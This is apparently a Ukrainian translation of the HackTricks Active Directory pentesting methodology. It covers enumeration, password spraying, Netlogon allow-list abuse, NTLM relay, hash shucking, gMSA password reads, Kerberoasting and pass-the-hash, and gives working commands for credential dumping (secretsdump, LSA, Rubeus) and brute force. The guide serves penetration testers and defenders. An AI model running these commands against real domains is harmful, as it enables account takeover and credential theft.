# Методологія Active Directory

{{#include ../../banners/hacktricks-training.md}}

## Базовий огляд

**Active Directory** є фундаментальною технологією, яка дає змогу **мережевим адміністраторам** ефективно створювати та керувати **доменами**, **користувачами** й **об’єктами** в мережі. Вона розроблена для масштабування, що дає змогу організовувати велику кількість користувачів у керовані **групи** та **підгрупи**, контролюючи **права доступу** на різних рівнях.

Структура **Active Directory** складається з трьох основних рівнів: **доменів**, **дерев** і **лісів**. **Домен** охоплює набір об’єктів, таких як **користувачі** або **пристрої**, що використовують спільну базу даних. **Дерева** — це групи таких доменів, об’єднаних спільною структурою, а **ліс** — це набір кількох дерев, поєднаних через **довірчі відносини**, що формує найвищий рівень організаційної структури. На кожному з цих рівнів можна призначати певні **права доступу** та **комунікаційні права**.

Основні поняття в **Active Directory**:

1. **Каталог** – містить усю інформацію про об’єкти Active Directory.
2. **Об’єкт** – позначає сутності в каталозі, зокрема **користувачів**, **групи** або **спільні папки**.
3. **Домен** – слугує контейнером для об’єктів каталогу; у межах **лісу** можуть існувати кілька доменів, кожен із власним набором об’єктів.
4. **Дерево** – група доменів, які мають спільний кореневий домен.
5. **Ліс** – найвищий рівень організаційної структури в Active Directory, що складається з кількох дерев із **довірчими відносинами** між ними.

**Active Directory Domain Services (AD DS)** охоплює низку служб, критично важливих для централізованого керування та комунікації в мережі. До цих служб належать:

1. **Служби домену** – централізують зберігання даних і керують взаємодією між **користувачами** та **доменами**, зокрема функціями **автентифікації** та **пошуку**.
2. **Служби сертифікатів** – відповідають за створення, розповсюдження та керування захищеними **цифровими сертифікатами**.
3. **Служби полегшеного каталогу** – підтримують застосунки, що використовують каталог, через **протокол LDAP**.
4. **Служби федерації каталогів** – забезпечують можливості **єдиного входу (single sign-on)** для автентифікації користувачів у кількох вебзастосунках протягом одного сеансу.
5. **Керування правами** – допомагає захищати матеріали, що охороняються авторським правом, регулюючи їх несанкціоноване розповсюдження та використання.
6. **Служба DNS** – критично важлива для розв’язання **доменних імен**.

Для докладнішого пояснення перегляньте: [**TechTerms - визначення Active Directory**](https://techterms.com/definition/active_directory)

### **Автентифікація Kerberos**

Щоб навчитися **атакувати AD**, потрібно дуже добре **розуміти** процес **автентифікації Kerberos**.\
[**Прочитайте цю сторінку, якщо ще не знаєте, як це працює.**](kerberos-authentication.md)

## Шпаргалка

Ви можете багато чого знайти на [https://wadcoms.github.io/](https://wadcoms.github.io), щоб швидко переглянути, які команди можна виконувати для перерахування/експлуатації AD.

> [!WARNING]
> Для обміну даними Kerberos зазвичай **потрібне повне доменне ім’я (FQDN)**, щоб клієнт міг отримати квиток для правильного SPN. Доступ до машини за IP-адресою зазвичай призводить до використання NTLM замість Kerberos.

## Розвідка Active Directory (без creds/сеансів)

Якщо ви маєте доступ до середовища AD, але не маєте жодних облікових даних/сеансів, ви можете:

- **Виконати Pentest мережі:**
- Просканувати мережу, знайти машини та відкриті порти й спробувати **експлуатувати вразливості** або **отримати облікові дані** з них (наприклад, [принтери можуть бути дуже цікавими цілями](ad-information-in-printers.md)).
- Перерахування DNS може надати інформацію про ключові сервери в домені, як-от вебсервери, принтери, шари, vpn, медіа тощо.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Перегляньте загальну [**методологію Pentesting**](../../generic-methodologies-and-resources/pentesting-methodology.md), щоб дізнатися більше про те, як це робити.
- **Перевірити null- і Guest-доступ до служб smb** (це не працюватиме в сучасних версіях Windows):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Докладніший посібник із перерахування SMB-сервера можна знайти тут:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Перерахувати Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- Докладніший посібник із перерахування LDAP можна знайти тут (зверніть **особливу увагу на анонімний доступ**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Отруїти мережу**
- Отримати облікові дані, [**імітуючи служби за допомогою Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Отримати доступ до хоста, [**зловживаючи relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Отримати облікові дані, **виставивши** [**фальшиві UPnP-служби за допомогою evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Витягувати імена користувачів/імена з внутрішніх документів, соціальних мереж і служб (переважно вебслужб) усередині доменних середовищ, а також із загальнодоступних джерел.
- Якщо ви знайдете повні імена працівників компанії, можна спробувати різні **правила формування імен користувачів AD (**[**прочитайте це**](https://activedirectorypro.com/active-directory-user-naming-convention/)). Найпоширеніші правила: _NameSurname_, _Name.Surname_, _NamSur_ (по 3 літери кожного), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _випадкові літери та 3 випадкові цифри_ (abc123).
- Інструменти:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### Перерахування користувачів

- **Анонімне перерахування SMB/LDAP:** перегляньте сторінки [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) і [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Перерахування Kerbrute**: Коли запитується **недійсне ім’я користувача**, сервер відповідає кодом **помилки Kerberos** _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, що дає змогу визначити недійсність імені користувача. Для **дійсних імен користувачів** буде отримано або **TGT у відповіді AS-REP**, або помилку _KRB5KDC_ERR_PREAUTH_REQUIRED_, яка вказує, що користувач повинен пройти попередню автентифікацію.
- **Відсутність автентифікації проти MS-NRPC**: використання auth-level = 1 (без автентифікації) проти інтерфейсу MS-NRPC (Netlogon) на контролерах домену. Метод викликає функцію `DsrGetDcNameEx2` після прив’язки до інтерфейсу MS-NRPC, щоб перевірити, чи існує користувач або комп’ютер, без використання облікових даних. Інструмент [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) реалізує такий тип перерахування. Дослідження доступне [тут](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)<sup>[[11]](#references)</sup>
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

Якщо ви виявили один із таких серверів у мережі, ви також можете виконати **перерахування користувачів на ньому**. Наприклад, можна використати інструмент [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> Ви можете знайти списки імен користувачів у [**цьому github-репозиторії**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) та в цьому ([**статистично ймовірні імена користувачів**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Однак вам слід мати **імена людей, які працюють у компанії**, отримані на етапі recon, який ви мали виконати до цього. Маючи ім'я та прізвище, ви могли б використати скрипт [**namemash.py**](https://gist.github.com/superkojiman/11076951) для генерації потенційно дійсних імен користувачів.

### Зловживання allow-list для вразливого каналу Netlogon (Onelogon)

Навіть після встановлення патча для **Zerologon** на DC явно додані до allow-list облікові записи все ще можуть бути вразливими через **застарілу/вразливу поведінку захищеного каналу Netlogon**. Небезпечною конфігурацією є GPO **`Domain controller: Allow vulnerable Netlogon secure channel connections`** або відповідне значення реєстру **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`**.

Це значення є **дескриптором безпеки SDDL** (див. [Дескриптори безпеки](security-descriptors.md)). Будь-який обліковий запис або група, які мають відповідний ACE у DACL, можуть бути ціллю. Наприклад, `O:BAG:BAD:(A;;RC;;;WD)` фактично додає **Everyone** до allow-list.

Практичний workflow оператора:

1. **Визначте principals, додані до allow-list**, перевіривши **SYSVOL/GPO** та **живий реєстр DC**.
2. **Зіставте SID**, знайдені в SDDL, із реальними користувачами/комп'ютерами AD і надайте пріоритет **обліковим записам комп'ютерів DC**, **обліковим записам довірених доменів** та іншим привілейованим машинам.
3. Повторювано виконуйте спроби **автентифікації MS-NRPC / Netlogon** від імені облікового запису, доданого до allow-list.
4. Після успішного підбору скористайтеся **встановленням пароля через Netlogon**, щоб скинути пароль цільового облікового запису (публічний PoC встановлює його як порожній рядок).<sup>[[9]](#references)[[10]](#references)</sup>

Приклади швидкого triage / лабораторного використання з публічного артефакту:
```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
--comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```
Нотатки:

- **scanner** корисний, оскільки effective allow-list може міститися в **SYSVOL**, у **registry** або в обох місцях.
- Сам exploit path важливий, оскільки після ідентифікації вразливого облікового запису він **не потребує привілеїв Domain Admin**.
- Компрометація **machine account Domain Controller**, наприклад `DC$`, особливо небезпечна, оскільки скидання цього пароля може безпосередньо уможливити ширші шляхи **AD takeover**.
- **Brute-force feasibility** залежить від режиму: публічний артефакт описує meet-in-the-middle підхід, **24-bit** brute force за наявності іншого computer account і повільніші варіанти на **32-bit**.

Нотатки щодо detection / hardening:

- Перевірте політику allow-list і видаліть усе, крім тимчасових, явно необхідних compatibility exceptions.
- Відстежуйте **System** events **5827/5828/5829/5830/5831** на DC, щоб виявляти вразливі Netlogon connections, які були відхилені, виявлені або явно дозволені політикою.
- Вважайте accounts у `VulnerableChannelAllowList` **high-risk**, доки legacy dependency не буде усунуто.

### Знання одного або кількох usernames

Отже, ви знаєте, що вже маєте дійсний username, але не маєте passwords... Тоді спробуйте:

- [**ASREPRoast**](asreproast.md): Якщо user **не має** атрибута _DONT_REQ_PREAUTH_, ви можете **request a AS_REP message** для цього user; він міститиме дані, зашифровані похідним від його password.
- [**Password Spraying**](password-spraying.md): Спробуймо найпоширеніші **common passwords** для кожного з виявлених users; можливо, хтось використовує слабкий password (пам’ятайте про password policy!).
- Зауважте, що ви також можете **spray OWA servers**, щоб спробувати отримати доступ до mail servers users.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Можливо, вам вдасться **obtain** деякі challenge **hashes**, виконуючи **poisoning** деяких протоколів **network**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Enumeration Active Directory надає usernames, email identifiers і naming patterns, candidate hosts та services, які можна примусити виконати authentication. Використовуйте цей контекст, щоб визначити придатні [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) NTLM і potential paths до середовища AD.

### NetExec: recon & relay posture checks на основі workspace

- Використовуйте **`nxcdb` workspaces**, щоб зберігати стан AD recon окремо для кожного engagement: `workspace create <name>` створює окремі SQLite DB для кожного протоколу в `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap тощо). Перемикайте views за допомогою `proto smb|mssql|winrm` і переглядайте зібрані secrets за допомогою `creds`. Після завершення вручну видаліть sensitive data: `rm -rf ~/.nxc/workspaces/<name>`.<sup>[[6]](#references)</sup>
- Швидке subnet discovery за допомогою **`netexec smb <cidr>`** показує **domain**, **OS build**, **SMB signing requirements** і **Null Auth**. Members із позначкою `(signing:False)` є **relay-prone**, тоді як DC часто вимагають signing.
- Створюйте **hostnames у /etc/hosts** безпосередньо з output NetExec, щоб спростити targeting:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- Коли **SMB relay to the DC is blocked** через signing, все одно перевіряйте стан **LDAP**: `netexec ldap <dc>` показує `(signing:None)` / слабке channel binding. DC із обов’язковим SMB signing, але вимкненим LDAP signing, залишається придатною ціллю для **relay-to-LDAP** атак, таких як **SPN-less RBCD**.

### Client-side printer credential leaks → масова перевірка доменних облікових даних

- Веб-інтерфейси принтерів іноді **містять замасковані паролі адміністраторів у HTML**. Перегляд вихідного коду або devtools може розкрити пароль у відкритому вигляді (наприклад, `<input value="<password>">`), що дає змогу отримати Basic-auth доступ до репозиторіїв сканування/друку.
- Отримані завдання друку можуть містити **документи онбордингу з паролями користувачів у відкритому вигляді**. Під час тестування зберігайте відповідність між парами:<sup>[[6]](#references)</sup>
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Steal NTLM Creds

Якщо ви можете **отримати доступ до інших ПК або shares** за допомогою **null або guest user**, ви можете **розмістити файли** (наприклад, SCF-файл), які в разі доступу до них **ініціюють NTLM-аутентифікацію на вашу адресу**, що дасть змогу **викрасти** **NTLM challenge** для його crack:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** розглядає кожен NT hash, який у вас уже є, як candidate password для інших, повільніших форматів, матеріал ключів яких безпосередньо походить від NT hash. Замість brute-force довгих passphrase у Kerberos RC4 tickets, NetNTLM challenges або cached credentials ви передаєте NT hashes у NT-candidate modes Hashcat і даєте йому перевірити повторне використання паролів, не отримуючи plaintext. Це особливо ефективно після компрометації domain, коли можна зібрати тисячі поточних та історичних NT hashes.<sup>[[5]](#references)</sup>

Використовуйте shucking, якщо:

- У вас є NT corpus із DCSync, SAM/SECURITY dumps або credential vaults і потрібно перевірити повторне використання в інших domains/forests.
- Ви захопили Kerberos material на основі RC4 (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM responses або DCC/DCC2 blobs.
- Ви хочете швидко підтвердити повторне використання довгих passphrase, які неможливо crack, і відразу виконати pivot через Pass-the-Hash.

Ця техніка **не працює** проти encryption types, ключі яких не є NT hash (наприклад, Kerberos etype 17/18 AES). Якщо domain застосовує лише AES, потрібно повернутися до звичайних password modes.

#### Building an NT hash corpus

- **DCSync/NTDS** – Використовуйте `secretsdump.py` з history, щоб отримати якомога більший набір NT hashes (і їхні попередні значення):

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

Записи history значно розширюють candidate pool, оскільки Microsoft може зберігати до 24 попередніх hashes для кожного account. Більше способів отримання NTDS secrets:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (або Mimikatz `lsadump::sam /patch`) витягує дані локальних SAM/SECURITY і cached domain logons (DCC/DCC2). Видаліть дублікати та додайте ці hashes до того самого списку `nt_candidates.txt`.
- **Track metadata** – Зберігайте username/domain, з яких було отримано кожен hash (навіть якщо wordlist містить лише hex). Hashes, що збігаються, одразу покажуть, який principal повторно використовує пароль, коли Hashcat виведе знайдений candidate.
- Надавайте перевагу candidates з того самого forest або trusted forest; це максимізує ймовірність збігу під час shucking.

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Примітки:

- NT-candidate inputs **мають залишатися raw 32-hex NT hashes**. Вимкніть rule engines (без `-r` і без hybrid modes), оскільки mangling пошкоджує candidate key material.
- Ці modes не є inherently faster, але NTLM keyspace (~30,000 MH/s на M3 Max) приблизно у 100 разів швидший за Kerberos RC4 (~300 MH/s). Перевірка curated NT list значно дешевша, ніж перебір усього password space у повільному форматі.
- Завжди використовуйте **latest Hashcat build** (`git clone https://github.com/hashcat/hashcat && make install`), оскільки modes 31500/31600/35300/35400 були додані нещодавно.<sup>[[7]](#references)</sup>
- Наразі не існує NT mode для AS-REQ Pre-Auth, а AES etypes (19600/19700) потребують plaintext password, оскільки їхні ключі виводяться через PBKDF2 з UTF-16LE passwords, а не з raw NT hashes.

#### Example – Kerberoast RC4 (mode 35300)

1. Захопіть RC4 TGS для target SPN за допомогою low-privileged user (деталі див. на сторінці Kerberoast):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Виконайте shuck ticket за допомогою вашого NT list:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat виводить RC4 key з кожного NT candidate і перевіряє `$krb5tgs$23$...` blob. Збіг підтверджує, що service account використовує один із ваших наявних NT hashes.

3. Негайно виконайте pivot через PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

За потреби plaintext можна відновити пізніше за допомогою `hashcat -m 1000 <matched_hash> wordlists/`.

#### Example – Cached credentials (mode 31600)

1. Зробіть dump cached logons із compromised workstation:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Скопіюйте рядок DCC2 для потрібного domain user у `dcc2_highpriv.txt` і виконайте shuck:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. Успішний match повертає NT hash, який уже відомий у вашому list, підтверджуючи, що cached user повторно використовує пароль. Використайте його безпосередньо для PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) або виконайте brute-force у fast NTLM mode, щоб відновити string.

Такий самий workflow застосовується до NetNTLM challenge-responses (`-m 27000/27100`) і DCC (`-m 31500`). Після ідентифікації match можна запустити relay, SMB/WMI/WinRM PtH або повторно crack NT hash за допомогою masks/rules offline.



## Enumerating Active Directory WITH credentials/session

На цьому етапі потрібно, щоб ви **скомпрометували credentials або session дійсного domain account.** Якщо у вас є valid credentials або shell від імені domain user, **пам’ятайте, що наведені вище options усе ще дають змогу скомпрометувати інших users**.

Перед початком authenticated enumeration зрозумійте **Kerberos double-hop problem**.


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Компрометація account є **важливим кроком для оцінки domain**, оскільки вона дає змогу виконувати authenticated **Active Directory enumeration**:

Щодо [**ASREPRoast**](asreproast.md), тепер можна знайти кожного потенційно вразливого user, а щодо [**Password Spraying**](password-spraying.md) — отримати **список усіх usernames** і спробувати пароль скомпрометованого account, порожні passwords і нові promising passwords.

- Можна використати [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info)
- Також можна використовувати [**powershell for recon**](../basic-powershell-for-pentesters/index.html), що буде stealthier
- Також можна [**use powerview**](../basic-powershell-for-pentesters/powerview.md) для отримання детальнішої information
- Ще одним чудовим tool для recon в active directory є [**BloodHound**](bloodhound.md). Він **не дуже stealthy** (залежно від collection methods, які ви використовуєте), але **якщо це вас не турбує**, обов’язково спробуйте його. Знайдіть, де users можуть виконувати RDP, знайдіть path до інших groups тощо.
- **Інші automated AD enumeration tools:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records of the AD**](ad-dns-records.md), оскільки вони можуть містити цікаву information.
- **Tool with GUI**, який можна використовувати для enumeration directory, — **AdExplorer.exe** із **SysInternal** Suite.
- Також можна виконувати search у LDAP database за допомогою **ldapsearch**, щоб шукати credentials у полях _userPassword_ та _unixUserPassword_ або навіть у _Description_. Див. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) щодо інших methods.
- Якщо ви використовуєте **Linux**, можна також виконувати enumeration domain за допомогою [**pywerview**](https://github.com/the-useless-one/pywerview).
- Також можна спробувати automated tools:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extracting all domain users**

Дуже легко отримати всі domain usernames у Windows (`net user /domain`, `Get-DomainUser` або `wmic useraccount get name,sid`). У Linux можна використовувати: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` або `enum4linux -a -u "user" -p "password" <DC IP>`

> Навіть якщо цей розділ Enumeration здається невеликим, це найважливіша його частина. Відкрийте links (передусім links для cmd, powershell, powerview і BloodHound), навчіться виконувати enumeration domain і практикуйтеся, доки не почуватиметеся впевнено. Під час assessment це буде ключовим моментом для пошуку шляху до DA або для визначення, що нічого зробити не можна.

### Predictable pre-created computer accounts -> gMSA password access

Computer accounts, підготовлені для legacy joins, можуть зберігати передбачуваний initial password. Модуль `pre2k` у NetExec ідентифікує характерне значення `userAccountControl` `4128` (`WORKSTATION_TRUST_ACCOUNT | PASSWD_NOTREQD`) і намагається отримати Kerberos TGT, використовуючи перші 14 символів lowercase computer name без кінцевого `$`. Розглядайте це UAC value як candidate selector, а не припускайте, що саме членство в **Pre-Windows 2000 Compatible Access** доводить слабкість password.<sup>[[18]](#references)[[20]](#references)</sup>

Використовуйте authenticated LDAP enumeration для перевірки candidates і збереження успішних TGTs. `ALL=True` розширює testing за межі objects зі стандартним `4128` filter.<sup>[[18]](#references)</sup>
```bash
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k -o ALL=True

# Validate a candidate explicitly with Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k
```
Невдалий default/NTLM bind **не** анулює це виявлення: виконайте тест із `-k`, використовуючи FQDN, який розпізнається в адресу DC, і час, синхронізований із KDC. Успішні запуски модуля записують списки кандидатів і отримані ccaches у `~/.nxc/modules/pre2k/`.<sup>[[18]](#references)[[20]](#references)</sup>

Після компрометації computer principal побудуйте граф його вкладених членств у групах і вихідних прав. Зокрема, principals, зазначені в дескрипторі безпеки `msDS-GroupMSAMembership` gMSA, можуть читати `msDS-ManagedPassword`; вивід NetExec із `--gmsa` показує дозволені principals і повертає поточний NT-хеш, коли computer, що проходить автентифікацію, авторизований.<sup>[[19]](#references)[[20]](#references)</sup>
```bash
# Enumerate gMSAs and their password readers with the initial user
netexec ldap dc.corp.local -u auditor -p 'Password!' --gmsa

# Re-query as the compromised computer through Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k --gmsa
```
Потім оцініть отриманий gMSA як будь-які інші облікові дані: перевірте членство в локальних/доменних групах, права входу, SPN, delegation і доступні служби, перш ніж використовувати pass-the-hash. Цей шлях отримання на основі ACL відрізняється від [Golden gMSA/dMSA](golden-dmsa-gmsa.md), який виводить керовані паролі після компрометації кореневого ключа KDS.<sup>[[20]](#references)</sup>

### Kerberoast

Kerberoasting передбачає отримання **TGS tickets**, які використовуються службами, пов'язаними з обліковими записами користувачів, і їх offline cracking — шифрування цих квитків базується на паролях користувачів.

Докладніше про це:

{{#ref}}
kerberoast.md
{{#endref}}

### Віддалене підключення (RDP, SSH, FTP, Win-RM тощо)

Отримавши певні облікові дані, можна перевірити, чи маєте ви доступ до будь-якої **machine**. Для цього можна використати **CrackMapExec**, щоб спробувати підключитися до кількох серверів за допомогою різних протоколів відповідно до результатів сканування портів.

### Локальна ескалація привілеїв

Якщо ви скомпрометували облікові дані або маєте сесію звичайного користувача домену та можете отримати доступ до **будь-якої machine у домені**, шукайте шлях для **локальної ескалації привілеїв і збору облікових даних**. Привілеї локального адміністратора можуть дозволити вам **отримати хеші інших користувачів** із пам'яті (LSASS) і локального сховища (SAM).

У цій книзі є окрема сторінка про [**локальну ескалацію привілеїв у Windows**](../windows-local-privilege-escalation/index.html) і [**чекліст**](../checklist-windows-privilege-escalation.md). Також не забудьте використати [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Квитки поточної сесії

Дуже **малоймовірно**, що в поточного користувача ви знайдете **квитки**, які **надають дозвіл на доступ** до неочікуваних ресурсів, але можна перевірити:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Маючи доменні облікові дані або сесію користувача, повторно перевірте NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack): автентифіковане перерахування та coercion techniques можуть виявити шляхи relay, які були недоступні під час неавтентифікованої розвідки.

### Пошук Creds у спільних ресурсах комп'ютерів | SMB Shares

Тепер, коли у вас є базові облікові дані, слід перевірити, чи можете ви **знайти** якісь **цікаві файли, до яких надано спільний доступ усередині AD**. Це можна зробити вручну, але це дуже нудне повторюване завдання (особливо якщо ви знайдете сотні документів, які потрібно перевірити).

[**Перейдіть за цим посиланням, щоб дізнатися про інструменти, які можна використовувати.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Викрадення NTLM Creds

Якщо ви можете **отримати доступ до інших ПК або спільних ресурсів**, ви можете **розмістити файли** (наприклад, SCF-файл), які в разі доступу до них **спричинять автентифікацію NTLM проти вас**, щоб ви могли **викрасти** **NTLM challenge** для його злому:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Ця вразливість дозволяла будь-якому автентифікованому користувачу **скомпрометувати контролер домену**.


{{#ref}}
printnightmare.md
{{#endref}}

## Підвищення привілеїв в Active Directory З привілейованими обліковими даними/сесією

**Для наведених нижче технік звичайного користувача домену недостатньо — для виконання цих атак потрібні спеціальні привілеї/облікові дані.**

### Витягування хешів

Сподіваємося, вам вдалося **скомпрометувати обліковий запис локального адміністратора**, використовуючи [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md), зокрема relay, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [локальне підвищення привілеїв](../windows-local-privilege-escalation/index.html).\
Тепер настав час видобути всі хеші з пам'яті та локально.\
[**Прочитайте цю сторінку про різні способи отримання хешів.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Отримавши хеш користувача**, ви можете використати його, щоб **імперсонувати** цього користувача.\
Вам потрібно використати певний **інструмент**, який **виконає** **автентифікацію NTLM за допомогою** цього **хешу**, **або** ви можете створити нову **sessionlogon** і **впровадити** цей **хеш** у **LSASS**, щоб під час виконання будь-якої **автентифікації NTLM** використовувався саме **цей хеш**. Останній варіант реалізує mimikatz.\
[**Прочитайте цю сторінку, щоб дізнатися більше.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Ця атака має на меті **використати хеш NTLM користувача для запиту квитків Kerberos**, як альтернативу поширеному Pass The Hash через протокол NTLM. Отже, це може бути особливо **корисно в мережах, де протокол NTLM вимкнено** і як протокол автентифікації дозволено лише **Kerberos**.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

